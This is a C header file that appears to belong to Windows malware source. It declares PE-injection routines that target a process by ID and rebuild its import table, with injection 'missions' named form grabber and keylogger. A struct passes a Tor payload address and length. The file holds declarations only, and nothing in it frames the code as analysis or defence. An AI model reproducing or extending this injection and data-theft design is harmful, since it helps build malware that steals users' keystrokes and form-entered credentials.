#pragma once
#include <Windows.h>

VOID ReCreateIAT(PIMAGE_DOS_HEADER dos_header, PIMAGE_NT_HEADERS nt_header);

//bool pe_injection_main(DWORD target_pid, bool is_manager);

#define INJECTION_MISSION_FORM_GRABBER 1
#define INJECTION_MISSION_KEYLOGGER 2

bool manager_pe_injection(DWORD target_pid, LPVOID localCopyImage, DWORD localCopyImage_size, int injection_mission);

bool main_pe_injection(DWORD target_pid, LPVOID localCopyImage, DWORD localCopyImage_size, PVOID tor_payload_address, DWORD tor_payload_len);

typedef struct {
	PVOID imageBase;
	PVOID tor_payload_address;
	DWORD tor_payload_len;

} MANAGER_INJECTION_ENTRY_POINT_PARAMS;


